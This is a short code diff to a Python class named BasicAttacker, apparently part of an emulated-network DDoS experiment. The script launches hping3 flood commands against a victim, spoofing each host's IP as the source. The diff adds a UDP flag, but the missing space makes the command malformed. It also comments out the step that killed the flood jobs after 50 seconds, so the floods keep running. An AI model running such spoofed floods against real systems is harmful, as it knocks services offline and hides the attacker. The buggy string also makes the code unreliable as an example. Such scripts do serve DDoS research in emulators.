@@ -31,17 +31,17 @@ class BasicAttacker:
 
         for host in self.hosts:
             spoof_ip = host.IP()
-            ddos_cmd = 'hping3 --flood ' + self.victim.IP() + ' -a ' + spoof_ip + ' &'
+            ddos_cmd = 'hping3 --flood --udp' + self.victim.IP() + ' -a ' + spoof_ip + ' &'
             self.attacker.cmd(ddos_cmd)
             print ddos_cmd
 
-        time.sleep(50)
-        print("killing all.....")
-        for host in self.hosts:
-            spoof_ip = host.IP()
-            ddos_cmd = 'kill $(jobs -p)'
-            self.attacker.cmd(ddos_cmd)
-            print ddos_cmd
+        # time.sleep(50)
+        # print("killing all.....")
+        # for host in self.hosts:
+        #     spoof_ip = host.IP()
+        #     ddos_cmd = 'kill $(jobs -p)'
+        #     self.attacker.cmd(ddos_cmd)
+        #     print ddos_cmd
 
 
         
